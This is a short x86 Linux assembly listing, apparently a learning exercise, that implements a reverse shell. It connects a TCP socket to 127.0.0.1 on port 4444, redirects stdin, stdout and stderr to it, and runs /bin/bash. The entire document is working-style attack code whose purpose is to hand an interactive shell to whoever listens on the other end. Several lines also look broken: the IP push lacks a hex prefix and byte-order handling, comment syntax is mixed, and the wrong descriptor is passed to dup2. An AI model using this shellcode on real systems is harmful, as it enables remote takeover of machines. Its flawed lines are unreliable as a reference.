global _start

section .text
_start:

  # Socket()
mov eax, 102 #socket syscall #
mov ebx, 1 #socket subfunction #
push 0
push 1
push 2 # same arguments as the tcp bind assembly

mov ecx, esp # put stack pointer in ecx

int 0x80 #interrupt

mov edi, eax # saving file descriptor (return value)

# Connect()
mov eax, 102 # socket syscall again
mov ebx, 3 # subfunction number for 'connect'
push dword 7F000001 # IP address 127.0.0.1
push word 0x5C11 # port 4444
push word 2 # AF_INET
mov ecx, esp

push 16 # addrlen
push ecx # sockaddr struct
push edi # sockfd (file descriptor, return value from socket())

mov ecx, esp # stack pointer into ecx

int 0x80 # interrupt

mov ebx, eax ; file descriptor into ebx because its the first arg  
mov ecx, 0; stdin  
mov eax, 63 ; syscall # for dup2()  
int 0x80

mov eax, 63  
mov ecx, 1; stdout  
int 0x80

mov eax, 63  
mov ecx, 2; stderr  
int 0x80

push dword 0 ; padding/ zero termination for string  
push 0x68736162 ; "////bin/bash"; backwards  
push 0x2f6e6962  
push 0x2f2f2f2f

mov ebx, esp ; mov the first arg, filename (path to bash) into ebx  
mov edx, 0 ; envp = NULL  
mov ecx, 0 ; argv = NULL

mov eax, 11 ; syscall # for execve  
int 0x80  
